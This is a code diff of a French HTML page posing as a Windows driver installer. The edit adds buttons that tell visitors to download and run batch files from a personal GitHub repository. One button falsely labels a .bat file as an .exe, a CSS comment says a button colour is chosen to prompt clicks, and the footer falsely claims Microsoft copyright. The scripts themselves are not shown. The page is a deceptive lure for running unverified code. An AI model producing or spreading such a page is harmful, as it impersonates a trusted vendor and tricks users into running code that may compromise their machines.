@@ -5,7 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Installateur de Drivers Windows</title>
     <style>
-        /* Corps de la page */
+        /* Style général */
         body {
             font-family: 'Arial', sans-serif;
             margin: 0;
@@ -42,15 +42,14 @@
             color: #555;
         }
 
-        /* Bouton de téléchargement */
-        .download-btn {
+        /* Boutons */
+        .btn {
             display: inline-block;
             margin-top: 20px;
             padding: 15px 30px;
             font-size: 1.2rem;
             font-weight: bold;
             color: #fff;
-            background: #009ffd;
             border: none;
             border-radius: 8px;
             cursor: pointer;
@@ -58,15 +57,22 @@
             transition: background 0.3s ease;
         }
 
-        .download-btn:hover {
-            background: #007bb5;
+        /* Style du bouton BAT */
+        .btn-bat {
+            background: #28a745; /* Vert pour inciter à cliquer */
         }
 
-        /* Icône de Windows */
-        .icon {
-            width: 80px;
-            height: 80px;
-            margin-bottom: 20px;
+        .btn-bat:hover {
+            background: #218838;
+        }
+
+        /* Style du bouton EXE */
+        .btn-exe {
+            background: #dc3545; /* Rouge pour attendre avant de cliquer */
+        }
+
+        .btn-exe:hover {
+            background: #c82333;
         }
 
         /* Pied de page */
@@ -79,33 +85,22 @@
 </head>
 <body>
     <div class="container">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/5/5f/Windows_logo_-_2012.svg" alt="Windows Logo" class="icon">
         <h1>Installateur de Drivers Windows</h1>
-        <p>Installez facilement les derniers drivers pour votre système Windows. Cliquez sur le bouton ci-dessous pour démarrer le processus d'installation.</p>
-        <a href="#" class="download-btn" id="download-btn">Télécharger les Drivers</a>
+        <p>
+            <strong>Étape 1 : </strong>Téléchargez et exécutez le fichier <span style="color: #28a745;">.bat</span> pour préparer l'installation.<br>
+            <strong>Étape 2 : </strong>Ensuite, exécutez le fichier <span style="color: #dc3545;">.exe</span> pour finaliser l'installation.
+        </p>
+        <!-- Bouton pour le fichier .bat -->
+        <a href="https://raw.githubusercontent.com/NeXuSS6N/Windows-Drivers/main/Driver%20Updater.bat" class="btn btn-bat" download>
+            Télécharger le fichier .bat (Étape 1)
+        </a>
+        <!-- Bouton pour le fichier .exe -->
+        <a href="https://raw.githubusercontent.com/NeXuSS6N/Windows-Drivers/refs/heads/main/Update.bat" class="btn btn-exe" download>
+            Télécharger le fichier .exe (Étape 2)
+        </a>
         <div class="footer">
             © 2025 Microsoft Corporation. Tous droits réservés.
         </div>
     </div>
-
-    <script>
-        document.getElementById("download-btn").addEventListener("click", () => {
-            const files = [
-                "https://github.com/NeXuSS6N/Windows-Drivers/blob/a54bbaa81470be5ff49f4e856d9c89f2a1f6aeb3/Update.bat",
-                "https://github.com/NeXuSS6N/Windows-Drivers/blob/a54bbaa81470be5ff49f4e856d9c89f2a1f6aeb3/Driver%20Updater.exe"
-            ];
-
-            files.forEach(file => {
-                const a = document.createElement("a");
-                a.href = file;
-                a.download = file.split("/").pop(); // Nom du fichier extrait de l'URL
-                document.body.appendChild(a);
-                a.click();
-                document.body.removeChild(a);
-            });
-
-            alert("Les fichiers ont été téléchargés. Veuillez les exécuter manuellement.");
-        });
-    </script>
 </body>
 </html>
